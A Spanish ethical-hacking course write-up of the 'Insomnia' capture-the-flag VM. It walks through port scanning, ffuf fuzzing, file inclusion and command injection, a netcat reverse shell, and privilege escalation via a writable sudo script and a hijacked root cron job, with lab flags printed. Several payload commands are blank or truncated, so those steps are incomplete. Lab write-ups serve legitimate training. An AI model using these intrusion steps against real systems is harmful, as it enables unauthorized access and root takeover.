---
title: "🖥️ Máquina: Insomnia — Hacking Ético"
aliases:
  - Insomnia
  - insomnia
  - Máquina Insomnia
  - VM Insomnia
  - Writeup Insomnia
tags:
  - ifct0109
  - hacking-etico
  - vms
  - vulnerabilidades-web
  - linux
  - ctf
---

# 🖥️ Máquina: Insomnia

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Vulnerabilidades Web  
> **Técnicas trabajadas:** Fuzzing web · Local File Inclusion · Command Injection · Reverse Shell · Escalada de privilegios (sudo + script escribible) · Cron Job Hijacking  
> **Descripción:** En esta práctica descubriremos un parámetro vulnerable a Local File Inclusion y Command Injection en una aplicación web, obtendremos una reverse shell como www-data, escalaremos a julia abusando de un script escribible ejecutable con sudo, y finalmente escalaremos a root mediante una tarea cron con permisos de escritura.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / Insomnia):** Ej. `10.0.0.25`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Insomnia tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Exportamos la IP de la víctima como variable de entorno:

```bash
export rhost=10.0.0.25
```

```bash
nmap -sT -p- $rhost
```

```text
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

> [!info] Resultado
> Solo hay un puerto abierto: 8080, un servidor web. No hay SSH ni otros servicios. Toda la explotación pasará por la web.

---

## 🌐 Fase 2: Fuzzing web con ffuf

Usamos ffuf para descubrir archivos y rutas en el servidor. La primera pasada con el diccionario medium puede tardar, así que refinamos con el diccionario small y filtrando por tamaño de respuesta con -fs para eliminar falsos positivos:

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.0.25:8080/FUZZ -e .php,.txt,.html -fs 2899
```

```text
administration.php  [Status: 200, Size: 65,  Words: 12, Lines: 3]
chat.txt            [Status: 200, Size: 25,  Words: 2,  Lines: 5]
process.php         [Status: 200, Size: 2,   Words: 1,  Lines: 1]
```

> [!info] Resultado
> Tres archivos interesantes. Visitamos administration.php:

```bash
curl http://10.0.0.25:8080/administration.php
```

```text
You are not allowed to view : 
Your activity has been logged
```

> [!info] Resultado
> El archivo existe pero nos deniega el acceso y además registra nuestra actividad. Esto sugiere que acepta algún parámetro que no estamos enviando. Usamos ffuf para descubrir qué parámetro GET acepta, probando si alguno nos permite leer un archivo del sistema como /etc/passwd. Filtramos con -fs 65 para ignorar las respuestas que tienen el mismo tamaño que la página de error (65 bytes):

```bash
ffuf -c -r -u
```

```text
logfile  [Status: 200, Size: 76, Words: 12, Lines: 3]
```

> [!info] Resultado
> El parámetro vulnerable es logfile. La aplicación acepta una ruta de archivo a través de este parámetro y lo muestra en la respuesta, lo que es una vulnerabilidad de Local File Inclusion (LFI). Comprobamos que funciona leyendo el archivo chat.txt que encontramos antes:

---

## 💉 Fase 3: LFI y Command Injection

```bash
curl
```

> [!info] Resultado
> Vemos el contenido del chat. Ahora probamos si además del LFI hay command injection añadiendo un punto y coma y un comando después del nombre del archivo. El punto y coma en la URL termina el valor del parámetro y lo que sigue se interpreta como un comando de shell:

```bash
curl
```

> [!info] Resultado
> El resultado del id aparece reflejado en la respuesta. Tenemos Command Injection. Leemos /etc/passwd filtrando solo los usuarios con shell real:

```bash
curl
```

```text
root:x:0:0:root:/root:/bin/bash
julia:x:1000:1000:julia,,,:/home/julia:/bin/bash
```

> [!info] Resultado
> Dos usuarios con shell: root y julia. Comprobamos si nc está disponible en la víctima para usarlo en la reverse shell:

```bash
curl
```

```text
/usr/bin/nc
```

> [!info] Resultado
> nc está disponible. Lanzamos la reverse shell.

---

## 🐚 Fase 4: Reverse Shell

Nos ponemos a la escucha en Kali en una terminal:

```bash
nc -lvnp 9002
```

Y desde otra terminal lanzamos la conexión inversa a través del command injection:

```bash

```

```text
listening on [any] 9002 ...
connect to [10.0.0.7] from (UNKNOWN) [10.0.0.25] 42006
```

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Mejoramos la shell con Python para tener una terminal más funcional:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## ↔️ Fase 5: Movimiento lateral a julia — sudo + script escribible

```bash
sudo -l
```

```text
User www-data may run the following commands on insomnia:
    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh
```

> [!info] Resultado
> www-data puede ejecutar /var/www/html/start.sh como el usuario julia sin contraseña. Comprobamos los permisos del script:

```bash
ls -la /var/www/html/start.sh
```

```text
-rwxrwxrwx 1 root root 20 Dec 21  2020 /var/www/html/start.sh
```

> [!info] Resultado
> El script tiene permisos de escritura para todos los usuarios (rwxrwxrwx). Podemos añadir cualquier comando al final. Añadimos una bash que se ejecutará con la identidad de julia cuando lancemos el script con sudo:

```bash
echo '/bin/bash' >> /var/www/html/start.sh
```

```bash
sudo -u julia /bin/bash /var/www/html/start.sh
```

```bash
id
```

```text
uid=1000(julia) gid=1000(julia) groups=1000(julia),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

```bash
cat /home/julia/user.txt
```

```text
~~~~~~~~~~~~~\
USER INSOMNIA
~~~~~~~~~~~~~
Flag : [c2e285cb33cecdbeb83d2189e983a8c0]
```

> [!info] Resultado
> Flag de usuario obtenida: c2e285cb33cecdbeb83d2189e983a8c0

---

## 🚀 Fase 6: Escalada de privilegios — Cron Job Hijacking

Revisamos las tareas programadas del sistema:

```bash
cat /etc/crontab
```

```text
*  *  *  *  *  root  /bin/bash /var/cron/check.sh
```

> [!info] Resultado
> Root ejecuta /var/cron/check.sh cada minuto. Comprobamos si tenemos permisos de escritura sobre ese archivo:

```bash
ls -la /var/cron/check.sh
```

> [!info] Resultado
> El archivo es escribible. Añadimos una reverse shell al final. En una nueva terminal de Kali nos ponemos a la escucha:

```bash
nc -lvnp 9003
```

Desde la shell de julia añadimos la reverse shell al script de cron:

```bash

```

> [!info] Resultado
> Esperamos como máximo un minuto a que cron ejecute la tarea. Cuando llegue la conexión comprobamos que somos root:

```text
listening on [any] 9003 ...
connect to [10.0.0.7] from (UNKNOWN) [10.0.0.25] ...
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

```text
~~~~~~~~~~~~~~~\
ROOTED INSOMNIA
~~~~~~~~~~~~~~~
Flag : [c84baebe0faa2fcdc2f1a4a9f6e2fbfc]
by Alienum with <3
```

> [!info] Resultado
> Flag de root obtenida: c84baebe0faa2fcdc2f1a4a9f6e2fbfc

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
